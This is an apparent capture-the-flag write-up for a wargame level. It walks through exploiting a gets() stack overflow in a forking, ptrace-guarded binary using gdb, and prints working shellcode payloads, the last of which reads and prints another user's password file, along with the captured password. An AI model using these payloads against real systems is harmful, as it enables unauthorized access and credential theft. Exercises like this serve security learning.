## LEVEL 03
---
### For a better understanding of the levels and the solutions, I recommend you to read the [disassemble file](./asm/level03.asm) and the [source file](./src/level03.c). This README only contains the most important parts to solve the level.
---
### Security
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

For this level the usage of buffer overflow is possible.

---

I recommend that you read the entire source code because this level features complex code. My explanation will be brief, because it utilizes the same technique as many previous levels. If you encounter any difficulties in understanding, I suggest referring to the previous levels and my [rainfall](https://github.com/mathias-mrsn/rainfall) repository. I'm confident that you will find the answers to your questions there.

First thing I notice is that the program use `gets` who has a hugh vulnerability that we already used in the first levels of rainfall. So I will use it again.

```c
gets(local_var_20);
```

The second thing I noticed is the usage of `fork` for the first time. Essentially, `fork` creates a duplicate of the process, including its entire memory. Therefore, if we want to overwrite a specific address, we need to follow the child process using GDB. To achieve this, we can utilize the `follow-fork-mode` option.

```bash
(gdb) set follow-fork-mode child
```

I export the shellcode inside environment variable `SHELLCODE` and easily find the address of it.

```bash
export SHELLCODE=$(python -c 'print "\x90"*64 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Now we can launch gdb and find the length between the buffer and where the return address is stored. Also called the EIP offset.

```bash
(gdb) x/x $ebp+4
0xffffd6ac:	0xf7e45513
(gdb) x/x $esp+0x20
0xffffd610:	0x00000000
```

The EIP offset is 0x9c. Now we can use the same technique as the previous levels to overwrite the return address. Now we just need to address the address of the environment variable `SHELLCODE` to overwrite the address of the return address with it.

```bash
(gdb) x/s *((char**)environ)
0xffffd844:	 "SHELLCODE=\220\220\220\220\220\220\220\220
```

The address of the environment variable `SHELLCODE` is 0xffffd844. I add 0x20 to the address to jump over the environment variable name and reach the NOP. The final address is 0xffffd864.

Now we have everything we need to exploit this level. 

```bash
$ (python -c 'print "\x90"*156 + "\x44\xd8\xff\xff"'; cat -) | ./level04
Give me some shellcode, k
no exec() for you
```

No this doesn't seem to work. But why ?

```c
local_var_a8 = ptrace(3, local_var_ac, 0x2c, 0);
```

If we look this line that is executed in the parent process, we can see that the parent process is waiting for the child process to execute the `exec` syscall. If the child process doesn't execute the `exec` syscall, the parent process will kill the child process. And this is exactly what is happening here. The child process is killed before it can execute the `exec` syscall.

So I have to use code injection through `SHELLCODE` environment variable but this code must not execute `exec()`.

I use [this]("https://shell-storm.org/shellcode/index.html") website that I used in the level2 of rainfall to find the perfect shellcode. And I found it.

```shell
$ export SHELLCODE=$(python -c 'print "\x90"*64 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"')
```

This shellcode only use libc functions already loaded inside the compiled binary. So it doesn't need to execute `exec()`, it only use C functions. Now let's try it.

```bash
$ (python -c 'print "\x90"*156 + "\x64\xd8\xff\xff"') | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```

---

*Source :*

*https://sourceware.org/gdb/onlinedocs/gdb/Forks.html*